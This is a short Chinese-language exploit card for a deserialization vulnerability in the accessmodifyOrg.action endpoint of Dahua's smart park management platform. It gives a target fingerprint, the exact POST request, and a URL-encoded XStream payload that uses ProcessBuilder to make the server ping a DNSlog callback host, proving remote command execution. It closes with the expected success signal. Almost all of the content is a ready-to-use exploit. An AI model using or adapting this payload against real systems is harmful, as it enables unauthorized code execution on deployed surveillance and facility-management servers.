# 大华智慧园区综合管理平台accessmodifyOrg.action存在反序列化漏洞

- **系统**：大华　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`body="src=\"`
- **请求**：`POST /admin/accessmodifyOrg.action HTTP/1.1`
- **关键头**：`Host: target.com`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 77`

**请求体 / payload**
```
xmlInfo=%3Csorted-set%3E%0A%3Cstring%3Efoo%3C/string%3E%0A%3Cdynamic-proxy%3E%0A%3Cinterface%3Ejava.lang.Comparable%3C/interface%3E%0A%3Chandler%20class%3D%22java.beans.EventHandler%22%3E%0A%3Ctarget%20class%3D%22java.lang.ProcessBuilder%22%3E%0A%3Ccommand%3E%0A%3Cstring%3Eping%3C/string%3E%0A%3Cstring%3Exxxxx.dnslog.cn%3C/string%3E%0A%3C/command%3E%0A%3C/target%3E%0A%3Caction%3Estart%3C/action%3E%0A%3C/handler%3E%0A%3C/dynamic-proxy%3E%0A%3C/sorted-set%3E
```
- **预期**：200　|　Dnslog回显